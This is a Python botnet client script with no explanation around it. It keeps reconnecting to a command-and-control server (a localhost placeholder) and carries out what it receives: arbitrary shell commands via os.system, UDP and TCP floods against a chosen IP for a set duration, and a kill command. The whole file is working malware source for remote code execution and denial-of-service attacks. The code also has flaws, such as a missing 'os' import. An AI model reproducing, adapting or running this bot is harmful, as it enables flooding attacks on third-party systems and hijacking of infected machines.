import sys
import time
import socket
import random
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "localhost" # IP for the bot to connect to
port = 8888 # Port for the bot to connect to

connected = False

def system():
	global sock
	global connected

	while not connected:
		try:
			sock.connect((host, port))
			connected = True
		except:
			pass

	print("Connected")

	while connected is True:
		try:
			def commands():
				msg = sock.recv(1024)
				if ">killbots" in msg.lower():
					sys.exit()

				if ">shell" in msg.lower():
					try:
						shell = msg.split(" ")[1]
						os.system(shell)
					except:
						pass

				if ">udp" in msg.lower():
					def udpflood():
						import socket
						try:
							ip = msg.split(" ")[1]
							psize = int(msg.split(" ")[2])
							timer = int(float(msg.split(" ")[3]))

							timeout = time.time() + 1 * timer

							package = random._urandom(psize)

							udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)

							print("Command Accepted!")
							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

							while True:
								port = random.randint(1, 65535)
								udpflood.sendto(package, (ip, port))
								udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
								if time.time() > timeout:
									return
						except:
							pass
					udpflood()

				if ">tcp" in msg.lower():
					def tcpflood():
						import socket
						try:
							ip = msg.split(" ")[1]
							psize = int(msg.split(" ")[2])
							timer = int(float(msg.split(" ")[3]))

							timeout = time.time() + 1 * timer

							package = random._urandom(psize)

							tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

							tcpflood.connect((ip, 80))

							print("Command Accepted!")
							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

							while True:
								port = random.randint(1, 65535)
								tcpflood.sendto(package, (ip, port))
								tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
								if time.time() > timeout:
									return
						except:
							pass
					tcpflood()
			commands()
			threads = []
			for i in range(1):
			    thread = threading.Thread(target=commands)
			    threads.append(thread)
			    thread.setDaemon(True)
			    thread.start()
		except socket.error:
			connected = False
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			print("Disconnected")
			while not connected:
				try:
					sock.connect((host, port))
					connected = True
					print("Reconnected")
				except socket.error:
					pass
	sock.close()
system()
